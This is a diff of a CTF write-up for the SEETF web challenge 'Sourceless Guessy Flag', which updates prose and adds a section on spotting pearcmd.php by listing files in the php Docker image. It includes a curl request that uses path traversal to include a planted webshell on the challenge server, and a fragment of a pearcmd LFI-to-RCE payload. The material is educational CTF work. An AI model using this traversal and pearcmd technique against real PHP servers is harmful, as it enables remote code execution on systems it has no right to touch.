@@ -1,7 +1,4 @@
-# Challenge Name
-
-![](Pasted%20image%2020220604122429.png)
-
+# Sourceless Guessy Flag
 
 ## Solution (Baby Flag)
 
@@ -49,7 +46,7 @@ SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}
 
 ### How I found out in the CTF
 
-I randomly tried accessing `/tmp/hi.php` because I tried creating it via another exploit (phpinfo LFI to RCE). Never expect someone else to do the same. I looked at `pearcmd.php` and realised this could lead to a webshell.
+I randomly tried accessing `/tmp/hi.php` because I tried creating it via another exploit (phpinfo LFI to RCE). Never expect someone else already create it. It included the file `/usr/local/lib/php/pearcmd.php` and realised this could lead to a webshell.
 
 ```html
 (base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/hi.php" 
@@ -90,9 +87,10 @@ whysoserious/pear/man";}    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
 
 ### Pearcmd exploit
 
-[https://ctftime.org/writeup/30236](https://ctftime.org/writeup/30236 "https://ctftime.org/writeup/30236") 
+On researching more in pearcmd, I found out that there are other writeups for it already. We could use the payloads there
 
-[https://chowdera.com/2022/02/202202080401099387.html](https://chowdera.com/2022/02/202202080401099387.html "https://chowdera.com/2022/02/202202080401099387.html")
+- [https://ctftime.org/writeup/30236](https://ctftime.org/writeup/30236 "https://ctftime.org/writeup/30236") 
+- [https://chowdera.com/2022/02/202202080401099387.html](https://chowdera.com/2022/02/202202080401099387.html "https://chowdera.com/2022/02/202202080401099387.html")
 
 First I tested that the file I'm creating does not exist yet
 
@@ -354,6 +352,163 @@ a:12:{s:7:"php_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l
 </script>
 (base) [hacker@hackerbook tmp]$ 
 ```
+
+### How you could have potentially found out in the CTF
+
+Looking at the eventual flag, I realised that we could have discovered the exploit **without** relying on other people exploit.
+
+Firstly, since this is a PHP web application, and CTFs generally used docker images, we could have inferred that a php container was used. 
+
+I firstly tried to download the container.
+
+```bash
+┌──(kali㉿kali)-[~/Documents/Notes/SEETF/username_gen]
+└─$ sudo docker run -it php bash
+[sudo] password for kali: 
+Unable to find image 'php:latest' locally
+latest: Pulling from library/php
+42c077c10790: Pull complete 
+8934009a9160: Pull complete 
+5357ac116991: Pull complete 
+54ae63894b5a: Pull complete 
+72281f038a08: Pull complete 
+9fd1b94317fe: Pull complete 
+00012d9e2ea5: Pull complete 
+2c220aff91be: Pull complete 
+48cfe9bf9b47: Pull complete 
+Digest: sha256:578dc5919121a9950174a1aa59d00815de87c767451320a527261763eafab8f0
+Status: Downloaded newer image for php:latest
+root@f869105b6e8b:/# ls
+bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+root@f869105b6e8b:/# cd /usr/local/lib/php/
+```
+
+We could then enumerate for php files. You can notice that `pearcmd.php` is inside, which could lead to an exploit.
+
+```
+root@f869105b6e8b:/# find -name "*.php"
+./usr/local/lib/php/OS/Guess.php
+./usr/local/lib/php/doc/XML_Util/examples/example.php
+./usr/local/lib/php/doc/XML_Util/examples/example2.php
+./usr/local/lib/php/Structures/Graph.php
+./usr/local/lib/php/Structures/Graph/Manipulator/AcyclicTest.php
+./usr/local/lib/php/Structures/Graph/Manipulator/TopologicalSorter.php
+./usr/local/lib/php/Structures/Graph/Node.php
+./usr/local/lib/php/Archive/Tar.php
+./usr/local/lib/php/PEAR/Config.php
+./usr/local/lib/php/PEAR/DependencyDB.php
+./usr/local/lib/php/PEAR/Dependency2.php
+./usr/local/lib/php/PEAR/Command.php
+./usr/local/lib/php/PEAR/Proxy.php
+./usr/local/lib/php/PEAR/PackageFile.php
+./usr/local/lib/php/PEAR/REST.php
+./usr/local/lib/php/PEAR/Downloader/Package.php
+./usr/local/lib/php/PEAR/Validate.php
+./usr/local/lib/php/PEAR/Builder.php
+./usr/local/lib/php/PEAR/Validator/PECL.php
+./usr/local/lib/php/PEAR/Command/Config.php
+./usr/local/lib/php/PEAR/Command/Remote.php
+./usr/local/lib/php/PEAR/Command/Auth.php
+./usr/local/lib/php/PEAR/Command/Test.php
+./usr/local/lib/php/PEAR/Command/Mirror.php
+./usr/local/lib/php/PEAR/Command/Pickle.php
+./usr/local/lib/php/PEAR/Command/Registry.php
+./usr/local/lib/php/PEAR/Command/Build.php
+./usr/local/lib/php/PEAR/Command/Channels.php
+./usr/local/lib/php/PEAR/Command/Install.php
+./usr/local/lib/php/PEAR/Command/Package.php
+./usr/local/lib/php/PEAR/Command/Common.php
+./usr/local/lib/php/PEAR/Downloader.php
+./usr/local/lib/php/PEAR/Task/Unixeol.php
+./usr/local/lib/php/PEAR/Task/Postinstallscript.php
+./usr/local/lib/php/PEAR/Task/Replace/rw.php
+./usr/local/lib/php/PEAR/Task/Replace.php
+./usr/local/lib/php/PEAR/Task/Windowseol.php
+./usr/local/lib/php/PEAR/Task/Postinstallscript/rw.php
+./usr/local/lib/php/PEAR/Task/Unixeol/rw.php
+./usr/local/lib/php/PEAR/Task/Windowseol/rw.php
+./usr/local/lib/php/PEAR/Task/Common.php
+./usr/local/lib/php/PEAR/Frontend/CLI.php
+./usr/local/lib/php/PEAR/Installer/Role.php
+./usr/local/lib/php/PEAR/Installer/Role/Php.php
+./usr/local/lib/php/PEAR/Installer/Role/Script.php
+./usr/local/lib/php/PEAR/Installer/Role/Man.php
+./usr/local/lib/php/PEAR/Installer/Role/Data.php
+./usr/local/lib/php/PEAR/Installer/Role/Src.php
+./usr/local/lib/php/PEAR/Installer/Role/Cfg.php
+./usr/local/lib/php/PEAR/Installer/Role/Test.php
+./usr/local/lib/php/PEAR/Installer/Role/Www.php
+./usr/local/lib/php/PEAR/Installer/Role/Doc.php
+./usr/local/lib/php/PEAR/Installer/Role/Ext.php
+./usr/local/lib/php/PEAR/Installer/Role/Common.php
+./usr/local/lib/php/PEAR/XMLParser.php
+./usr/local/lib/php/PEAR/Frontend.php
+./usr/local/lib/php/PEAR/ChannelFile/Parser.php
+./usr/local/lib/php/PEAR/ChannelFile.php
+./usr/local/lib/php/PEAR/Registry.php
+./usr/local/lib/php/PEAR/ErrorStack.php
+./usr/local/lib/php/PEAR/Exception.php
+./usr/local/lib/php/PEAR/REST/13.php
+./usr/local/lib/php/PEAR/REST/10.php
+./usr/local/lib/php/PEAR/REST/11.php
+./usr/local/lib/php/PEAR/PackageFile/v2/Validator.php
+./usr/local/lib/php/PEAR/PackageFile/v2/rw.php
+./usr/local/lib/php/PEAR/PackageFile/Generator/v1.php
+./usr/local/lib/php/PEAR/PackageFile/Generator/v2.php
+./usr/local/lib/php/PEAR/PackageFile/Parser/v1.php
+./usr/local/lib/php/PEAR/PackageFile/Parser/v2.php
+./usr/local/lib/php/PEAR/PackageFile/v1.php
+./usr/local/lib/php/PEAR/PackageFile/v2.php
+./usr/local/lib/php/PEAR/Installer.php
+./usr/local/lib/php/PEAR/RunTest.php
+./usr/local/lib/php/PEAR/Common.php
+./usr/local/lib/php/PEAR/Packager.php
+./usr/local/lib/php/Console/Getopt.php
+./usr/local/lib/php/XML/Util.php
+./usr/local/lib/php/test/XML_Util/tests/ApiVersionTests.php
+./usr/local/lib/php/test/XML_Util/tests/CreateTagFromArrayTests.php
+./usr/local/lib/php/test/XML_Util/tests/AttributesToStringTests.php
+./usr/local/lib/php/test/XML_Util/tests/RaiseErrorTests.php
+./usr/local/lib/php/test/XML_Util/tests/Bug21177Tests.php
+./usr/local/lib/php/test/XML_Util/tests/Bug5392Tests.php
+./usr/local/lib/php/test/XML_Util/tests/CreateTagTests.php
+./usr/local/lib/php/test/XML_Util/tests/GetXmlDeclarationTests.php
+./usr/local/lib/php/test/XML_Util/tests/CreateCDataSectionTests.php
+./usr/local/lib/php/test/XML_Util/tests/GetDocTypeDeclarationTests.php
+./usr/local/lib/php/test/XML_Util/tests/Bug21184Tests.php
+./usr/local/lib/php/test/XML_Util/tests/AbstractUnitTests.php
+./usr/local/lib/php/test/XML_Util/tests/IsValidNameTests.php
+./usr/local/lib/php/test/XML_Util/tests/Bug4950Tests.php
+./usr/local/lib/php/test/XML_Util/tests/CreateStartElementTests.php
+./usr/local/lib/php/test/XML_Util/tests/ReverseEntitiesTests.php
+./usr/local/lib/php/test/XML_Util/tests/SplitQualifiedNameTests.php
+./usr/local/lib/php/test/XML_Util/tests/CreateCommentTests.php
+./usr/local/lib/php/test/XML_Util/tests/CreateEndElementTests.php
+./usr/local/lib/php/test/XML_Util/tests/Bug18343Tests.php
+./usr/local/lib/php/test/XML_Util/tests/ReplaceEntitiesTests.php
+./usr/local/lib/php/test/XML_Util/tests/CollapseEmptyTagsTests.php
+./usr/local/lib/php/test/Structures_Graph/tests/AcyclicTestTest.php
+./usr/local/lib/php/test/Structures_Graph/tests/TopologicalSorterTest.php
+./usr/local/lib/php/test/Structures_Graph/tests/AllTests.php
+./usr/local/lib/php/test/Structures_Graph/tests/BasicGraphTest.php
+./usr/local/lib/php/pearcmd.php
+./usr/local/lib/php/peclcmd.php
+./usr/local/lib/php/build/gen_stub.php
+./usr/local/lib/php/build/run-tests.php
+./usr/local/lib/php/System.php
+./usr/local/lib/php/PEAR.php
+root@f869105b6e8b:/# 
+```
+
+We could locate the file we used in the exploit.
+
+```bash
+root@f869105b6e8b:/usr/local/lib/php# ls
+Archive  Console  OS  PEAR  PEAR.php  Structures  System.php  XML  build  data  doc  extensions  pearcmd.php  peclcmd.php  test
+root@f869105b6e8b:/usr/local/lib/php# 
+```
+
+This challenge taught me to look deeper, look at all parts of the infrastructure, instead of just being focused on specific techniques.
 
 ## Flags
 
